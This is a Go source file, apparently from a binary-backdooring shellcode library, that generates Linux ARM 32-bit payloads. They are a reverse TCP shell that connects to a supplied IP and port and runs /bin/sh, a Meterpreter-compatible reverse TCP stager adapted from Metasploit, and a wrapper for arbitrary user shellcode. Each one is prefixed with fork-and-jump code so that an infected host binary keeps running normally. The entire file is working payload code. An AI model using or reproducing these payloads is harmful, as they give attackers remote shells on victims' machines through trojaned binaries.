package modules

import "github.com/Binject/shellcode/api"

func init() {
	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
		"reverse_tcp_shell", reverse_tcp_shell_linux_arm_32)
	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
		"reverse_tcp_stager", reverse_tcp_stager_linux_arm_32)
	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
		"user_shellcode", user_shellcode_linux_arm_32)
}

func reverse_tcp_shell_linux_arm_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	shellcode_vaddr := uint32(0x0)
	ip := params.IP

	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, #2
	shellcode1 += "\x00\x00\x00\xef" // scv 0
	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, #
	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, #0
	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode

	// JMP Address = (entrypoint - currentaddress -8)/4
	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
	if as, err := api.PackUint32(jmpAddr); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xea" //b entrypoint

	//ACTUAL SHELLCODE
	shellcode1 += "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c\x70\xa0" +
		"\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60\xa0\xe1\x84\x10" +
		"\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0\xe3\x8e\x70\x87\xe2\x00" +
		"\x00\x00\xef\x06\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3" +
		"\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0" +
		"\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70" +
		"\xa0\xe3\x00\x00\x00\xef\x48\x00\x8f\xe2\x04\x40\x24\xe0\x10" +
		"\x00\x2d\xe9\x0d\x20\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1" +
		"\x10\x00\x2d\xe9\x48\x10\x9f\xe5\x02\x00\x2d\xe9\x00\x20\x2d" +
		"\xe9\x0d\x10\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1\x0b\x70" +
		"\xa0\xe3\x00\x00\x00\xef" +
		"\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef" + //exit
		"\x02\x00"

	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += api.PackIP(ip)

	shellcode1 += "\x2f\x62\x69\x6e" +
		"\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x43\x00" +
		"\x00"
	//exit test
	//shellcode1 += "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
	return []byte(shellcode1), nil

}

func reverse_tcp_stager_linux_arm_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	shellcode_vaddr := uint32(0x0)
	ip := params.IP

	/*
	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
	   Modified metasploit payload/linux/armle/shell/reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	//FORK
	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, #2
	shellcode1 += "\x00\x00\x00\xef" // scv 0
	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, #
	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, #0
	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
	// JMP Address = (entrypoint - currentaddress -8)/4
	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
	if as, err := api.PackUint32(jmpAddr); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xea" //b entrypoint

	//SHELLCODE
	shellcode1 += "\xb4\x70\x9f\xe5\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0" +
		"\xe3\x00\x00\x00\xef\x00\xc0\xa0\xe1\x02\x70\x87\xe2\x90\x10" +
		"\x8f\xe2\x10\x20\xa0\xe3\x00\x00\x00\xef\x0c\x00\xa0\xe1\x04" +
		"\xd0\x4d\xe2\x08\x70\x87\xe2\x0d\x10\xa0\xe1\x04\x20\xa0\xe3" +
		"\x00\x30\xa0\xe3\x00\x00\x00\xef\x00\x10\x9d\xe5\x70\x30\x9f" +
		"\xe5\x03\x10\x01\xe0\x01\x20\xa0\xe3\x02\x26\xa0\xe1\x02\x10" +
		"\x81\xe0\xc0\x70\xa0\xe3\x00\x00\xe0\xe3\x07\x20\xa0\xe3\x54" +
		"\x30\x9f\xe5\x00\x40\xa0\xe1\x00\x50\xa0\xe3\x00\x00\x00\xef" +
		"\x63\x70\x87\xe2\x00\x10\xa0\xe1\x0c\x00\xa0\xe1\x00\x30\xa0" +
		"\xe3\x00\x20\x9d\xe5\xfa\x2f\x42\xe2\x00\x20\x8d\xe5\x00\x00" +
		"\x52\xe3\x02\x00\x00\xda\xfa\x2f\xa0\xe3\x00\x00\x00\xef\xf7" +
		"\xff\xff\xea\xfa\x2f\x82\xe2\x00\x00\x00\xef\x01\xf0\xa0\xe1" +
		"\x02\x00"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x19\x01\x00\x00\x00\xf0\xff\xff\x22\x10\x00\x00"

	return []byte(shellcode1), nil
}

func user_shellcode_linux_arm_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	shellcode_vaddr := uint32(0x0)
	supplied_shellcode := params.ShellCode

	//FORK
	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, #2
	shellcode1 += "\x00\x00\x00\xef" // scv 0
	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, #
	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, #0
	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
	// JMP Address = (entrypoint - currentaddress -8)/4
	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
	if as, err := api.PackUint32(jmpAddr); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xea" //b entrypoint

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
